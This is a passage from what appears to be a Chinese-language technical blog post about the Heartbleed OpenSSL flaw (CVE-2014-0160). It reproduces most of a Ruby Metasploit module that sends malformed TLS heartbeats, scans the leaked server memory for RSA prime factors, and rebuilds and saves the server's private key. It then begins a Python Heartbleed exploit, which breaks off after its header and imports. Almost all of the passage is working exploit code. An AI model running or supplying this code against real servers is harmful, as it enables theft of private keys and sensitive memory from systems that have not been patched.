class="line"></span><br><span class="line">    <span class="comment"># Remove duplicate characters</span></span><br><span class="line">    abbreviated_data = printable_data.gsub(<span class="regexp">/(.)\1&#123;<span class="subst">#&#123;(<span class="variable constant_">DEDUP_REPEATED_CHARS_THRESHOLD</span> - <span class="number">1</span>)&#125;</span>,&#125;/</span>) <span class="keyword">do</span> |<span class="params">s</span>|</span><br><span class="line">      s[<span class="number">0</span>, duplicate_pad] +</span><br><span class="line">      <span class="string">&#x27; repeated &#x27;</span> + (s.length - (<span class="number">2</span> * duplicate_pad)).to_s + <span class="string">&#x27; times &#x27;</span> +</span><br><span class="line">      s[-duplicate_pad, duplicate_pad]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Show abbreviated data</span></span><br><span class="line">    vprint_status(<span class="string">&quot;Printable info leaked:\n<span class="subst">#&#123;abbreviated_data&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># Keydumping helper methods</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Tries to retrieve the private key</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_keys</span></span><br><span class="line">    connect_result = establish_connect</span><br><span class="line">    disconnect</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> connect_result.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;Scanning for private keys&quot;</span>)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;Getting public key constants...&quot;</span>)</span><br><span class="line">    n, e = get_ne</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n.<span class="literal">nil</span>? |<span class="params"></span>| e.<span class="literal">nil</span>?</span><br><span class="line">      print_error(<span class="string">&quot;Failed to get public key, aborting.&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    vprint_status(<span class="string">&quot;n: <span class="subst">#&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    vprint_status(<span class="string">&quot;e: <span class="subst">#&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    print_status(<span class="string">&quot;<span class="subst">#&#123;<span class="title class_">Time</span>.now.getutc&#125;</span> - Starting.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    max_keytries.times &#123;</span><br><span class="line">      <span class="comment"># Loop up to MAX_KEYTRIES times, looking for keys</span></span><br><span class="line">      <span class="keyword">if</span> count % status_every == <span class="number">0</span></span><br><span class="line">        print_status(<span class="string">&quot;<span class="subst">#&#123;<span class="title class_">Time</span>.now.getutc&#125;</span> - Attempt <span class="subst">#&#123;count&#125;</span>...&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      bleedresult = bleed</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">unless</span> bleedresult</span><br><span class="line"></span><br><span class="line">      p, q = get_factors(bleedresult, n) <span class="comment"># Try to find factors in mem</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">unless</span> p.<span class="literal">nil</span>? |<span class="params"></span>| q.<span class="literal">nil</span>?</span><br><span class="line">        key = key_from_pqe(p, q, e)</span><br><span class="line">        print_good(<span class="string">&quot;<span class="subst">#&#123;<span class="title class_">Time</span>.now.getutc&#125;</span> - Got the private key&quot;</span>)</span><br><span class="line"></span><br><span class="line">        print_status(key.export)</span><br><span class="line">        path = store_loot(</span><br><span class="line">          <span class="string">&#x27;openssl.heartbleed.server&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;text/plain&#x27;</span>,</span><br><span class="line">          rhost,</span><br><span class="line">          key.export,</span><br><span class="line">          <span class="literal">nil</span>,</span><br><span class="line">          <span class="string">&#x27;OpenSSL Heartbleed Private Key&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        print_status(<span class="string">&quot;Private key stored in <span class="subst">#&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      count += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    print_error(<span class="string">&quot;Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Returns the N and E params from the public server certificate</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_ne</span></span><br><span class="line">    <span class="keyword">unless</span> <span class="variable">@cert</span></span><br><span class="line">      print_error(<span class="string">&quot;No certificate found&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">@cert</span>.public_key.params[<span class="string">&#x27;n&#x27;</span>], <span class="variable">@cert</span>.public_key.params[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Tries to find pieces of the private key in the provided data</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_factors</span>(<span class="params">data, n</span>)</span><br><span class="line">    <span class="comment"># Walk through data looking for factors of n</span></span><br><span class="line">    psize = n.num_bits / <span class="number">8</span> / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> data.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">    (<span class="number">0</span>..(data.length-psize)).each&#123; |<span class="params">x</span>|</span><br><span class="line">      <span class="comment"># Try each offset of suitable length</span></span><br><span class="line">      can = <span class="title class_">OpenSSL::BN</span>.new(data[x,psize].reverse.bytes.inject &#123;|<span class="params">a,b</span>| (a &lt;&lt; <span class="number">8</span>) + b &#125;.to_s)</span><br><span class="line">      <span class="keyword">if</span> can &gt; <span class="number">1</span> &amp;&amp; can % <span class="number">2</span> != <span class="number">0</span> &amp;&amp; can.num_bytes == psize</span><br><span class="line">        <span class="comment"># Only try candidates that have a chance...</span></span><br><span class="line">        q, rem = n / can</span><br><span class="line">        <span class="keyword">if</span> rem == <span class="number">0</span> &amp;&amp; can != n</span><br><span class="line">          vprint_good(<span class="string">&quot;Found factor at offset <span class="subst">#&#123;x.to_s(<span class="number">16</span>)&#125;</span>&quot;</span>)</span><br><span class="line">          p = can</span><br><span class="line">          <span class="keyword">return</span> p, q</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Generates the private key from the P, Q and E values</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">key_from_pqe</span>(<span class="params">p, q, e</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span> )</span><br><span class="line">    d = <span class="title class_">OpenSSL::BN</span>.new(e).mod_inverse(phi)</span><br><span class="line"></span><br><span class="line">    dmp1 = d % (p - <span class="number">1</span>)</span><br><span class="line">    dmq1 = d % (q - <span class="number">1</span>)</span><br><span class="line">    iqmp = q.mod_inverse(p)</span><br><span class="line"></span><br><span class="line">    asn1 = <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Sequence</span>(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(<span class="number">0</span>),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(n),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(e),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(d),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(p),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(q),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(dmp1),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(dmq1),</span><br><span class="line">        <span class="title class_">Open</span>SSL::<span class="variable constant_">ASN1</span><span class="symbol">:</span><span class="symbol">:Integer</span>(iqmp)</span><br><span class="line">      ]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    key = <span class="title class_">OpenSSL::PKey::RSA</span>.new(asn1.to_der)</span><br><span class="line">    key</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># SSL/TLS packet methods</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Creates and returns a new SSL record with the provided data</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">ssl_record</span>(<span class="params">type, data</span>)</span><br><span class="line">    record = [type, <span class="variable constant_">TLS_VERSION</span>[tls_version], data.length].pack(<span class="string">&#x27;Cnn&#x27;</span>)</span><br><span class="line">    record &lt;&lt; data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># generates a CLIENT_HELLO ssl/tls packet</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">client_hello</span></span><br><span class="line">    <span class="comment"># Use current day for TLS time</span></span><br><span class="line">    time_temp = <span class="title class_">Time</span>.now</span><br><span class="line">    time_epoch = <span class="title class_">Time</span>.mktime(time_temp.year, time_temp.month, time_temp.day, <span class="number">0</span>, <span class="number">0</span>).to_i</span><br><span class="line"></span><br><span class="line">    hello_data = [<span class="variable constant_">TLS_VERSION</span>[tls_version]].pack(<span class="string">&#x27;n&#x27;</span>) <span class="comment"># Version TLS</span></span><br><span class="line">    hello_data &lt;&lt; [time_epoch].pack(<span class="string">&#x27;N&#x27;</span>)    <span class="comment"># Time in epoch format</span></span><br><span class="line">    hello_data &lt;&lt; <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.rand_text(<span class="number">28</span>)   <span class="comment"># Random</span></span><br><span class="line">    hello_data &lt;&lt; <span class="string">&quot;\x00&quot;</span>                    <span class="comment"># Session ID length</span></span><br><span class="line">    hello_data &lt;&lt; [<span class="variable constant_">CIPHER_SUITES</span>.length * <span class="number">2</span>].pack(<span class="string">&#x27;n&#x27;</span>) <span class="comment"># Cipher Suites length (102)</span></span><br><span class="line">    hello_data &lt;&lt; <span class="variable constant_">CIPHER_SUITES</span>.pack(<span class="string">&#x27;n*&#x27;</span>)  <span class="comment"># Cipher Suites</span></span><br><span class="line">    hello_data &lt;&lt; <span class="string">&quot;\x01&quot;</span>                    <span class="comment"># Compression methods length (1)</span></span><br><span class="line">    hello_data &lt;&lt; <span class="string">&quot;\x00&quot;</span>                    <span class="comment"># Compression methods: null</span></span><br><span class="line"></span><br><span class="line">    hello_data_extensions = <span class="string">&quot;\x00\x0f&quot;</span>      <span class="comment"># Extension type (Heartbeat)</span></span><br><span class="line">    hello_data_extensions &lt;&lt; <span class="string">&quot;\x00\x01&quot;</span>     <span class="comment"># Extension length</span></span><br><span class="line">    hello_data_extensions &lt;&lt; <span class="string">&quot;\x01&quot;</span>         <span class="comment"># Extension data</span></span><br><span class="line"></span><br><span class="line">    hello_data &lt;&lt; [hello_data_extensions.length].pack(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    hello_data &lt;&lt; hello_data_extensions</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&quot;\x01\x00&quot;</span>                      <span class="comment"># Handshake Type: Client Hello (1)</span></span><br><span class="line">    data &lt;&lt; [hello_data.length].pack(<span class="string">&#x27;n&#x27;</span>)  <span class="comment"># Length</span></span><br><span class="line">    data &lt;&lt; hello_data</span><br><span class="line"></span><br><span class="line">    ssl_record(<span class="variable constant_">HANDSHAKE_RECORD_TYPE</span>, data)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_ssl_record</span></span><br><span class="line">    hdr = get_data(<span class="variable constant_">SSL_RECORD_HEADER_SIZE</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> hdr</span><br><span class="line">      vprint_error(<span class="string">&quot;No SSL record header received after <span class="subst">#&#123;response_timeout&#125;</span> seconds...&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    len = hdr.unpack(<span class="string">&#x27;Cnn&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line">    data = get_data(len) <span class="keyword">unless</span> len.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unless</span> data</span><br><span class="line">      vprint_error(<span class="string">&quot;No SSL record contents received after <span class="subst">#&#123;response_timeout&#125;</span> seconds...&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    hdr &lt;&lt; data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Get and parse server hello response until we hit Server Hello Done or timeout</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_server_hello</span></span><br><span class="line">    server_done = <span class="literal">nil</span></span><br><span class="line">    ssl_record_counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    remaining_data = get_ssl_record</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> remaining_data &amp;&amp; remaining_data.length &gt; <span class="number">0</span></span><br><span class="line">      ssl_record_counter += <span class="number">1</span></span><br><span class="line">      ssl_unpacked = remaining_data.unpack(<span class="string">&#x27;CH4n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> ssl_unpacked.<span class="literal">nil</span>? <span class="keyword">or</span> ssl_unpacked.length &lt; <span class="number">3</span></span><br><span class="line">      ssl_type = ssl_unpacked[<span class="number">0</span>]</span><br><span class="line">      ssl_version = ssl_unpacked[<span class="number">1</span>]</span><br><span class="line">      ssl_len = ssl_unpacked[<span class="number">2</span>]</span><br><span class="line">      vprint_status(<span class="string">&quot;SSL record #<span class="subst">#&#123;ssl_record_counter&#125;</span>:&quot;</span>)</span><br><span class="line">      vprint_status(<span class="string">&quot;\tType:    <span class="subst">#&#123;ssl_type&#125;</span>&quot;</span>)</span><br><span class="line">      vprint_status(<span class="string">&quot;\tVersion: 0x<span class="subst">#&#123;ssl_version&#125;</span>&quot;</span>)</span><br><span class="line">      vprint_status(<span class="string">&quot;\tLength:  <span class="subst">#&#123;ssl_len&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">if</span> ssl_type != <span class="variable constant_">HANDSHAKE_RECORD_TYPE</span></span><br><span class="line">        vprint_status(<span class="string">&quot;\tWrong Record Type! (<span class="subst">#&#123;ssl_type&#125;</span>)&quot;</span>)</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        ssl_data = remaining_data[<span class="number">5</span>, ssl_len]</span><br><span class="line">        handshakes = parse_handshakes(ssl_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Stop once we receive a SERVER_HELLO_DONE</span></span><br><span class="line">        <span class="keyword">if</span> handshakes &amp;&amp; handshakes.length &gt; <span class="number">0</span> &amp;&amp; handshakes[-<span class="number">1</span>][<span class="symbol">:type</span>] == <span class="variable constant_">HANDSHAKE_SERVER_HELLO_DONE_TYPE</span></span><br><span class="line">          server_done = <span class="literal">true</span></span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      remaining_data = get_ssl_record</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    server_done</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Parse Handshake data returned from servers</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">parse_handshakes</span>(<span class="params">data</span>)</span><br><span class="line">    <span class="comment"># Can contain multiple handshakes</span></span><br><span class="line">    remaining_data = data</span><br><span class="line">    handshakes = []</span><br><span class="line">    handshake_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> remaining_data &amp;&amp; remaining_data.length &gt; <span class="number">0</span></span><br><span class="line">      hs_unpacked = remaining_data.unpack(<span class="string">&#x27;CCn&#x27;</span>)</span><br><span class="line">      <span class="keyword">next</span> <span class="keyword">if</span> hs_unpacked.<span class="literal">nil</span>? <span class="keyword">or</span> hs_unpacked.length &lt; <span class="number">3</span></span><br><span class="line">      hs_type = hs_unpacked[<span class="number">0</span>]</span><br><span class="line">      hs_len_pad = hs_unpacked[<span class="number">1</span>]</span><br><span class="line">      hs_len = hs_unpacked[<span class="number">2</span>]</span><br><span class="line">      hs_data = remaining_data[<span class="number">4</span>, hs_len]</span><br><span class="line">      handshake_count += <span class="number">1</span></span><br><span class="line">      vprint_status(<span class="string">&quot;\tHandshake #<span class="subst">#&#123;handshake_count&#125;</span>:&quot;</span>)</span><br><span class="line">      vprint_status(<span class="string">&quot;\t\tLength: <span class="subst">#&#123;hs_len&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">      handshake_parsed = <span class="literal">nil</span></span><br><span class="line">      <span class="keyword">case</span> hs_type</span><br><span class="line">        <span class="keyword">when</span> <span class="variable constant_">HANDSHAKE_SERVER_HELLO_TYPE</span></span><br><span class="line">          vprint_status(<span class="string">&quot;\t\tType:   Server Hello (<span class="subst">#&#123;hs_type&#125;</span>)&quot;</span>)</span><br><span class="line">          handshake_parsed = parse_server_hello(hs_data)</span><br><span class="line">        <span class="keyword">when</span> <span class="variable constant_">HANDSHAKE_CERTIFICATE_TYPE</span></span><br><span class="line">          vprint_status(<span class="string">&quot;\t\tType:   Certificate Data (<span class="subst">#&#123;hs_type&#125;</span>)&quot;</span>)</span><br><span class="line">          handshake_parsed = parse_certificate_data(hs_data)</span><br><span class="line">        <span class="keyword">when</span> <span class="variable constant_">HANDSHAKE_KEY_EXCHANGE_TYPE</span></span><br><span class="line">          vprint_status(<span class="string">&quot;\t\tType:   Server Key Exchange (<span class="subst">#&#123;hs_type&#125;</span>)&quot;</span>)</span><br><span class="line">          <span class="comment"># handshake_parsed = parse_server_key_exchange(hs_data)</span></span><br><span class="line">        <span class="keyword">when</span> <span class="variable constant_">HANDSHAKE_SERVER_HELLO_DONE_TYPE</span></span><br><span class="line">          vprint_status(<span class="string">&quot;\t\tType:   Server Hello Done (<span class="subst">#&#123;hs_type&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          vprint_status(<span class="string">&quot;\t\tType:   Handshake type <span class="subst">#&#123;hs_type&#125;</span> not implemented&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      handshakes &lt;&lt; &#123;</span><br><span class="line">          <span class="symbol">:type</span>     =&gt; hs_type,</span><br><span class="line">          <span class="symbol">:len</span>      =&gt; hs_len,</span><br><span class="line">          <span class="symbol">:data</span>     =&gt; handshake_parsed</span><br><span class="line">      &#125;</span><br><span class="line">      remaining_data = remaining_data[(hs_len + <span class="number">4</span>)..-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    handshakes</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Parse Server Hello message</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">parse_server_hello</span>(<span class="params">data</span>)</span><br><span class="line">    version = data.unpack(<span class="string">&#x27;H4&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    vprint_status(<span class="string">&quot;\t\tServer Hello Version:           0x<span class="subst">#&#123;version&#125;</span>&quot;</span>)</span><br><span class="line">    random = data[<span class="number">2</span>,<span class="number">32</span>].unpack(<span class="string">&#x27;H*&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    vprint_status(<span class="string">&quot;\t\tServer Hello random data:       <span class="subst">#&#123;random&#125;</span>&quot;</span>)</span><br><span class="line">    session_id_length = data[<span class="number">34</span>,<span class="number">1</span>].unpack(<span class="string">&#x27;C&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    vprint_status(<span class="string">&quot;\t\tServer Hello Session ID length: <span class="subst">#&#123;session_id_length&#125;</span>&quot;</span>)</span><br><span class="line">    session_id = data[<span class="number">35</span>,session_id_length].unpack(<span class="string">&#x27;H*&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    vprint_status(<span class="string">&quot;\t\tServer Hello Session ID:        <span class="subst">#&#123;session_id&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># TODO Read the rest of the server hello (respect message length)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> return hash with data</span></span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Parse certificate data</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">parse_certificate_data</span>(<span class="params">data</span>)</span><br><span class="line">    <span class="comment"># get certificate data length</span></span><br><span class="line">    unpacked = data.unpack(<span class="string">&#x27;Cn&#x27;</span>)</span><br><span class="line">    cert_len_padding = unpacked[<span class="number">0</span>]</span><br><span class="line">    cert_len = unpacked[<span class="number">1</span>]</span><br><span class="line">    vprint_status(<span class="string">&quot;\t\tCertificates length: <span class="subst">#&#123;cert_len&#125;</span>&quot;</span>)</span><br><span class="line">    vprint_status(<span class="string">&quot;\t\tData length: <span class="subst">#&#123;data.length&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># contains multiple certs</span></span><br><span class="line">    already_read = <span class="number">3</span></span><br><span class="line">    cert_counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> already_read &lt; cert_len</span><br><span class="line">      cert_counter += <span class="number">1</span></span><br><span class="line">      <span class="comment"># get single certificate length</span></span><br><span class="line">      single_cert_unpacked = data[already_read, <span class="number">3</span>].unpack(<span class="string">&#x27;Cn&#x27;</span>)</span><br><span class="line">      single_cert_len_padding = single_cert_unpacked[<span class="number">0</span>]</span><br><span class="line">      single_cert_len =  single_cert_unpacked[<span class="number">1</span>]</span><br><span class="line">      vprint_status(<span class="string">&quot;\t\tCertificate #<span class="subst">#&#123;cert_counter&#125;</span>:&quot;</span>)</span><br><span class="line">      vprint_status(<span class="string">&quot;\t\t\tCertificate #<span class="subst">#&#123;cert_counter&#125;</span>: Length: <span class="subst">#&#123;single_cert_len&#125;</span>&quot;</span>)</span><br><span class="line">      certificate_data = data[(already_read + <span class="number">3</span>), single_cert_len]</span><br><span class="line">      cert = <span class="title class_">OpenSSL::X509::Certificate</span>.new(certificate_data)</span><br><span class="line">      <span class="comment"># First received certificate is the one from the server</span></span><br><span class="line">      <span class="variable">@cert</span> = cert <span class="keyword">if</span> <span class="variable">@cert</span>.<span class="literal">nil</span>?</span><br><span class="line">      <span class="comment">#vprint_status(&quot;Got certificate: #&#123;cert.to_text&#125;&quot;)</span></span><br><span class="line">      vprint_status(<span class="string">&quot;\t\t\tCertificate #<span class="subst">#&#123;cert_counter&#125;</span>: <span class="subst">#&#123;cert.inspect&#125;</span>&quot;</span>)</span><br><span class="line">      already_read = already_read + single_cert_len + <span class="number">3</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> return hash with data</span></span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></div><p>一个更轻量的常见 Python 版 exploit 为</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]</span></span><br><span class="line"><span class="comment"># Date: [2014-04-09]</span></span><br><span class="line"><span class="comment"># Exploit Author: [Csaba Fitzl]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [http://www.openssl.org/]</span></span><br><span class="line"><span class="comment"># Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]</span></span><br><span class="line"><span class="comment"># Version: [1.0.1f]</span></span><br><span class="line"><span class="comment"># Tested on: [N/A]</span></span><br><span class="line"><span class="comment"># CVE : [2014-0160]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span></span><br><span class="line"><span class="comment"># The author disclaims copyright to this source code.</span></span><br><span class="line"><span class="comment"># Modified by Csaba Fitzl for multiple SSL / TLS version support</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">&#x27;%prog server [options]&#x27;</span>, description=<span class="string">&#x27;Test for SSL heartbeat vulnerability 